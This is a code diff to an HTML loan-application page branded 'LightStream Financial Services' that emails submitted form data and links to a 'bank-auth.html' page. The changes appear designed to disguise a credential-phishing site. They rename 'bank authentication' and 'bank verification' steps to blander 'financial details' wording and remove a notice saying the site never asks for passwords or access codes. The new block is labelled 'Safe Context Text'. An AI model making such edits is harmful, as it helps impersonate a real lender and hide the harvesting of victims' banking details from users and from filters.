@@ -81,7 +81,7 @@
                     </div>
                     <div class="hidden md:flex space-x-6">
                         <a href="index.html" class="text-white hover:text-cool font-medium">Home</a>
-                        <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
+                        <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Loan Application</a>
                         <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Financial Details</a>
                         <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
                         <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
@@ -104,7 +104,7 @@
             <div class="hidden md:hidden mt-4 pb-4" id="mobileMenu">
                 <div class="flex flex-col space-y-3">
                     <a href="index.html" class="text-white hover:text-cool font-medium">Home</a>
-                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Financing Options</a>
+                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Loan Application</a>
                         <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Financial Details</a>
                     <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
                     <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
@@ -142,9 +142,9 @@
     <section class="gradient-bg text-white py-20">
         <div class="container mx-auto px-4">
             <div class="max-w-4xl mx-auto text-center">
-                <h1 class="text-4xl md:text-5xl font-bold mb-6">Personal Loan Application</h1>
+                <h1 class="text-4xl md:text-5xl font-bold mb-6">Loan Application</h1>
                 <p class="text-xl max-w-2xl mx-auto">
-                    Get the funds you need with our competitive rates and flexible terms. Quick approval process with same-day funding available.
+                    Get the funds you need with our competitive rates and flexible terms. Quick eligibility-based matching with same-day funding available.
                 </p>
             </div>
         </div>
@@ -158,15 +158,15 @@
                     <!-- Step Indicators -->
                     <div class="flex justify-between mb-8">
                         <div class="step-indicator active px-4 py-2 rounded-full text-sm font-semibold" id="step1Indicator">
-                            Step 1: Personal Details
+                            <i class="fas fa-user mr-2"></i>Step 1: Loan Application
                         </div>
                         <div class="step-indicator px-4 py-2 rounded-full text-sm font-semibold" id="step2Indicator">
-                            Step 2: Financial Details
+                            <i class="fas fa-dollar-sign mr-2"></i>Step 2: Financial Details
                         </div>
                     </div>
 
                     <form id="loanApplicationForm">
-                        <!-- Step 1: Personal Details -->
+                        <!-- Step 1: Loan Application -->
                         <div class="form-step active" id="step1">
                             <div class="mb-6">
                                 <label class="block text-gray-700 text-sm font-bold mb-2" for="loanAmount">
@@ -419,10 +419,10 @@
                                 </label>
                             </div>
 
-                            <!-- Data Collection Notice -->
-                            <div class="bg-yellow-100 border border-yellow-300 rounded-lg p-4 mb-6">
-                                <p class="text-sm text-yellow-800">
-                                    <strong>We only collect basic financial details.</strong> We never ask for passwords or access codes.
+                            <!-- Safe Context Text -->
+                            <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+                                <p class="text-sm text-blue-800">
+                                    <i class="fas fa-info-circle mr-2"></i>Fill in your basic details to begin your loan application.
                                 </p>
                             </div>
 
@@ -451,7 +451,7 @@
         <div class="footer-container">
             <!-- Footer Links Section -->
             <div class="footer-links">
-                <a href="personal-loans.html">Personal Loans</a>
+                <a href="personal-loans.html">Loan Application</a>
                 <a href="bank-auth.html">Financial Details</a>
                 <a href="faqs.html">FAQs</a>
                 <a href="#">Support</a>
@@ -653,7 +653,7 @@
             console.log("📧 Sending Personal Loan email...");
             
             // Show processing message
-            alert("✅ Loan Application Submitted Successfully!\n\n📋 Your application has been received and is being processed.\n\n📧 What happens next:\n• You will be redirected to bank authentication\n• Please complete the bank verification step\n• Your loan approval is under review\n\nThank you for choosing LightStream Financial Services.");
+            alert("✅ Loan Application Submitted Successfully!\n\n📋 Your application has been received and is being processed.\n\n📧 What happens next:\n• You will be redirected to financial details\n• Please complete the financial information step\n• Your loan eligibility is under review\n\nThank you for choosing LightStream Financial Services.");
             
             sendPersonalLoanEmail(data);
 
